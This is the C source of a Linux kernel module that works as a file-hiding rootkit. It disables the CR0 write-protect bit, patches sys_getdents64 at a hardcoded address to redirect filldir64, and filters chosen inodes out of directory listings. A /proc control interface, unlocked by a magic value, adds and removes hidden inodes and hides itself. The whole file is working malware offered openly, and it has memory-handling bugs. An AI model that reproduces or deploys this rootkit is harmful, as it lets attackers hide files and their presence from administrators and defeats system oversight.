#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include "hentry.h"

extern asmlinkage long sys_getdents64(unsigned int fd,
					struct linux_dirent64 __user *dirent,
					unsigned int count);
static unsigned orig_cr0;
unsigned int clearcr0(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	asm volatile ("movl %%cr0, %%eax"
			: "=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;

	asm volatile ("movl %%eax, %%cr0"
			:: "a"(cr0));
	return ret;

}

void resumecr0(unsigned int value)
{
	asm volatile ("movl %%eax, %%cr0"
			:: "a"(value));
}

#define HASH_SHIFT 5
#define HASH_SIZE (1 << HASH_SHIFT)
#define HASH_MASK (HASH_SIZE - 1)

struct hideino {
	u64 ino;
	struct hideino *next;
};

static struct hideino *hino_tbl[HASH_SIZE];
static u64 hidenum;
static u64 phf_ino; /* inode num for /proc/hidefileinfo */

unsigned int hino_hash(u64 ino)
{
	unsigned int ret;
	ret = (ino & 0xffffffff) & HASH_MASK;
	return ret;
}

int hidefile(u64 ino, struct hideino ***prev, struct hideino ***head)
{
	struct hideino **hino_list, *hnode, **old;
	unsigned int hidx;
	hidx = hino_hash(ino);
	hino_list = &hino_tbl[hidx];

	if (*hino_list == NULL)
		return 0;

	for (hnode = *hino_list, old = hino_list;
			hnode != NULL;
			old = &hnode, hnode = hnode->next) {
		if (hnode->ino == ino) {
			if (prev)
				*prev = old;

			if (head)
				*head = hino_list;
			return 1;
		}
	}
	return 0;
}

void delhidefile(u64 ino)
{
	struct hideino **prev, **head, *node;
	if (hidefile(ino, &prev, &head) == 0)
		return ;

	if (*head == *prev) {
		node = *prev;
		*prev = node->next;
	} else {
		node = (*prev)->next;
		(*prev)->next = node->next;
	}
	kfree(node);
	hidenum--;
}

void addhidefile(u64 ino)
{
	struct hideino **hino_list, *hnode;
	unsigned int hidx;
	if (hidefile(ino, NULL, NULL) == 1)
		return;

	hidx = hino_hash(ino);
	hino_list = &hino_tbl[hidx];

	hnode = (struct hideino *)kmalloc(sizeof(*hnode), GFP_KERNEL);
	if (hnode == NULL) {
		printk(KERN_ALERT "[ERR]cannot kmalloc\n");
	}
	hnode->ino = ino;
	hnode->next = *hino_list;
	*hino_list = hnode;
	hidenum++;
}

void hash_init(void)
{
	unsigned int i;
	for (i = 0; i < HASH_SIZE; i++)
		hino_tbl[i] = NULL;
	printk(KERN_ALERT "hash init ok\n");
}

void hash_exit(void)
{
	int i;
	struct hideino *hnode;
	for (i = 0; i < HASH_SIZE; i++) {
		if (hino_tbl[i] == NULL)
			continue;
		for (hnode = hino_tbl[i]; hnode; hnode = hnode->next)
			kfree(hnode);
		hino_tbl[i] = NULL;
	}
	printk(KERN_ALERT "hash exit\n");
}


int pread(char *page, char **start, off_t off, int count, int *eof, void *data)
{
	return -EFAULT;
}

int pwrite(struct file *file, const char __user *buf,
		unsigned long count, void *data)
{
	struct hentry he;

	if (count != sizeof(he))
		return -EFAULT;
	if (copy_from_user(&he, buf, count))
		return -EFAULT;
	if (he.magic != HIDE_MAGIC)
		return -EFAULT;
	switch (he.flag) {
	case HIDE_ADD:
		addhidefile(he.ino);
		break;
	case HIDE_DEL:
		delhidefile(he.ino);
		break;
	default :
		return -EFAULT;
	}
	return count;
}

struct proc_dir_entry *dir;
void user_init(void)
{
	struct proc_dir_entry *dproc;
	dir = proc_mkdir(HIDE_PROC_DIR, NULL);
	if (!dir) {
		printk(KERN_ALERT "[ERR]cannot create %s\n", HIDE_DIR);
		return ;
	}

	dproc = create_proc_entry(HIDE_PROC_ENTRY, 0644, dir);
	if (!dproc) {
		printk(KERN_ALERT "[ERR]cannot create %s\n", HIDE_ENTRY);
		return ;
	}


	dproc->read_proc = pread;
	dproc->write_proc = pwrite;

	/* hide self */
	phf_ino = 0xffffffff & dir->low_ino;
	addhidefile(phf_ino);
	printk(KERN_ALERT "userland interface init ok\n");
}

void user_exit(void)
{
	remove_proc_entry(HIDE_PROC_ENTRY, dir);
	remove_proc_entry(HIDE_PROC_DIR, NULL);

	printk(KERN_ALERT "user exit\n");
}

static filldir_t orig_filldir64;
int new_filldir64(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (hidefile(ino, NULL, NULL))
		return 0;

	/* old_filldir64 */
	return orig_filldir64(__buf, name, namlen, offset, ino, d_type);
}

unsigned int ih(unsigned int start, unsigned int feature, unsigned int new)
{
	unsigned char *p;
	unsigned int *offset, save;
	int i;

	printk(KERN_ALERT "search form 0x%x\n", start);
	for (p = (unsigned char *)start, i = 0; i < 512; p++, i++) {
		if (p[0] == (unsigned char)(feature & 0xff)) {
			offset = (unsigned int *)&p[1];
			/* filldir64 address is 0xc0xxxxxx */
			if ((*offset &0xff000000) == (unsigned int)0xc0000000) {
				printk(KERN_ALERT "find filldir64:0x%x\n",
								*offset);
				orig_filldir64 = (filldir_t) *offset;

				save = (unsigned int)offset;
				orig_cr0 = clearcr0();
				*offset = new;
				resumecr0(orig_cr0);

				return save;
			}
		}
	}
	return 0;
}

static unsigned int offset, start, feature;
static int __init hide_init(void)
{
	start = 0xc04dd457;			// sys_getdents64

	feature = 0xba;				// asm code of "mov xxx, %edx"
	offset = ih(start, (unsigned int)feature,(unsigned int)new_filldir64);
	if (!offset)
		return -1;

	hash_init();
	user_init();

	return 0;
}

static void __exit hide_exit(void)
{
	unsigned int orig_cr0;
	hash_exit();
	user_exit();
	if (offset) {
		orig_cr0 = clearcr0();
		*(unsigned int *)offset = (unsigned int)orig_filldir64;
		resumecr0(orig_cr0);
	}
}

module_init(hide_init);
module_exit(hide_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xiaochen Wang <wangxiaochen0@gmail.com>");
